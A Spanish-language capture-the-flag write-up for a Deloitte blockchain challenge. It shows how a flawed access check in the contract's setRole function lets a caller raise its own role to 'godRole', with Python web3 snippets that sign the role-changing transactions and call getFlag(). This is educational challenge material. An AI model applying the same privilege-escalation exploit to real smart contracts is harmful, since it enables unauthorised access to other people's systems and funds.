# blockchain02 #

- **Tipo:** Blockchain
- **Autor:** Deloitte
- **Autor del Writeup:** [focab0r](https://github.com/focab0r)
- **Flag:** `?`

## WriteUp ##

Al descomprimir el ZIP, nos encontramos ante tres archivos:
- contract.sol: Este es el contrato de la blockchain. Leyendo, se ve claramente que la flag se obtiene al llamar a la funcion `getFlag()`
- ABI\_and\_contract.txt: Contiene la direccion y el ABI del contrato. Este es un codigo necesario para interactuar con el contrato.
- accounts.txt: Aqui hay una gran cantidad de direcciones privadas existentes en la blockchain. Necesitaremos una de ellas para firmar transacciones.

Empezamos leyendo el contrato. Para que la funcion `getFlag()` nos devuelva la flag, comprueba antes que el rol del usuario que firma la transaccion es igual a "godRole", mediante la siguiente linea:
```
require(roles[msg.sender] == godRole, "Access denied."); // only accessible by GodRole
```
Este godRole se consigue con la funcion `getIdGodRole(address user)`. Sin embargo, esta tambien comprueba antes que el rol de nuestro usuario sea mayor que 2, por lo que tenemos que aumentar nuestro rol (a la derecha, en un comentario, pone que este es 1).
```
function getIdGodRole(address user) public view returns (uint) {
    require(roles[user] > 2, "Access denied."); // only accessible by role 1
    return godRole;
}
```
Por lo tanto, la unica solucion consiste en llamar a setRole y cambiar el rol del usuario. Afortunadamente, lo unico que comprueba la funcion es que el usuario del cual se quiera cambiar el rol, sea el mismo que el que firma la transaccion (Como "||" es un "OR", el resto de la restriccion no es necesaria).
```
require(msg.sender == user || roles[msg.sender] > 0, "Access denied.");
```

### Construyendo un codigo para obtener la flag (Python) ###

Podemos empezar comprobando que rol tenemos. Para ello, llamamos a la funcion `getRole(adress user)` y le pasamos nuestra direccion, previamente definida como account.adress. Printeamos el valor:
```
role = contract.functions.getRole(user_address).call()
print(f'The role of {user_address} is {role}')
```
Posteriormente, cambiamos nuestro rol y ponemos uno superior a 2. Como esta es una funcion que conlleva un cambio, la forma de llamarla es diferente, ya que es necesario firmarla:
```
nonce = web3.eth.get_transaction_count(account.address)
tx = contract.functions.setRole(user_address,3).build_transaction({
    'gas': 2000000,
    'gasPrice': web3.to_wei('10', 'gwei'),
    'nonce': nonce
})

signed_tx = web3.eth.account.sign_transaction(tx, private_key)
tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

```
Con los privilegios obtenidos, podemos ver el GodRole, llamando a la funcion correspondiente
```
godRole = contract.functions.getIdGodRole(user_address).call()
print(f'GodRole is {godRole}')
```
y actualizar posteriormente nuestro rol al GodRole:
```
nonce = web3.eth.get_transaction_count(account.address)
tx = contract.functions.setRole(user_address,godRole).build_transaction({
    'gas':2000000,
    'gasPrice':web3.to_wei('10','gwei'),
    'nonce': nonce
})

signed_tx = web3.eth.account.sign_transaction(tx, private_key)
tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
```
Finalmente, podemos llamar a la funcion getFlag(), pasandole nuestra direccion en el campo "from", tal como lo especifica el contrato.
```
flag = contract.functions.getFlag().call({'from': user_address})
print(f'Flag: {flag}')
```
El codigo completo se puede encontrar en "exploit.py"
